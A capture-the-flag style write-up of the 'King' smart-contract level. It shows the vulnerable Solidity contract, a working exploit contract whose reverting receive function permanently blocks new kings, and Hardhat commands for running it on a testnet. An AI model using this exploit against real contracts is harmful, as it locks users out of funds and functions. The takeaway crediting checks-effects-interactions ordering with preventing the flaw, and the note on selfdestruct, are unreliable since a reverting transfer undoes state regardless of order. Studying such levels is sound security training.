# Level 9: King

## Objective

The goal of this level is to break the King contract and prevent anyone else from becoming the king.

## Contract Overview

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {
    address king;
    uint256 public prize;
    address public owner;

    constructor() payable {
        owner = msg.sender;
        king = msg.sender;
        prize = msg.value;
    }

    receive() external payable {
        require(msg.value >= prize || msg.sender == owner);
        payable(king).transfer(msg.value);
        king = msg.sender;
        prize = msg.value;
    }

    function _king() public view returns (address) {
        return king;
    }
}
```

The King contract implements a simple "king of the hill" game:
- The contract has a king address and a prize amount
- Anyone can become the new king by sending more ETH than the current prize
- When a new king takes over, the old king receives the ETH sent by the new king
- The prize is updated to the new amount sent

## Vulnerability

The key vulnerability is in the `receive()` function:

```solidity
payable(king).transfer(msg.value);
```

This line attempts to transfer ETH to the previous king. If the king is a contract that doesn't accept ETH (by not implementing a receive or fallback function, or by intentionally reverting in these functions), then this transfer will fail, which will prevent anyone from becoming the new king.

## Exploit

We can exploit this vulnerability by:
1. Creating a contract that can become king
2. Ensuring that contract can't receive ETH by implementing a receive function that always reverts
3. Making that contract the king

Here's the exploit contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract KingExploit {
    address public kingContractAddress;
    address public owner;
    
    constructor(address _kingContractAddress) {
        kingContractAddress = _kingContractAddress;
        owner = msg.sender;
    }
    
    function claimThrone() public payable {
        // Send ETH to the King contract to become the new king
        (bool success, ) = payable(kingContractAddress).call{value: msg.value}("");
        require(success, "Failed to claim throne");
    }
    
    // Implementing receive function that reverts
    receive() external payable {
        revert("Cannot receive ETH");
    }
    
    // Implementing fallback function that also reverts
    fallback() external payable {
        revert("Cannot receive ETH");
    }
}
```

**Note**: Some might think simply not implementing a receive or fallback function would be sufficient. However, ETH can still be forcibly sent to contracts through a `selfdestruct` operation. By implementing a receive function that explicitly reverts, we ensure that when the King contract tries to transfer ETH back to our contract, the transaction will always fail, regardless of how ETH might have been sent to our contract.

## Steps to Exploit

1. Deploy the King contract with an initial prize:
   ```
   npx hardhat deploy --tags king
   ```

2. Deploy the KingExploit contract:
   ```
   npx hardhat deploy --tags king-solution
   ```
   
   Or with a specific King contract address:
   ```
   TARGET_ADDRESS=0xYourAddress npx hardhat deploy --tags king-solution
   ```

3. Run the exploit script to make the KingExploit contract the new king:
   ```
   EXPLOIT_ADDRESS=0xYourExploitAddress KING_ADDRESS=0xKingAddress npx hardhat run scripts/level-09-king/claim-throne.ts --network sepolia
   ```
   
   The `EXPLOIT_ADDRESS` is required and should be the address of your deployed KingExploit contract.
   The `KING_ADDRESS` is optional and will use a default address if not provided.

3. Verify that the exploit worked by trying to become the new king (which should fail)

## Key Takeaways

1. **External Call Safety**: When making external calls that can fail, consider using lower-level `call()` instead of `transfer()` or `send()` so you can handle failures more gracefully.

2. **Design for Failures**: Smart contracts should be designed to handle cases where external calls fail, especially when the contract's functioning depends on these calls.

3. **DoS Attacks**: This is an example of a Denial of Service (DoS) attack. A malicious contract can prevent legitimate functions from executing by exploiting the requirement that all contract calls must succeed.

4. **Checks-Effects-Interactions Pattern**: Following this pattern could have prevented the vulnerability. The contract should update its state (setting the new king) before making external calls (sending ETH to the old king).

## Prevention

To prevent this vulnerability:
- Use the checks-effects-interactions pattern
- Use `call()` with proper error handling instead of `transfer()`
- Implement a pull-payment system where users withdraw funds themselves
- Consider adding a function to allow the owner to reclaim kingship in case of a DoS attack
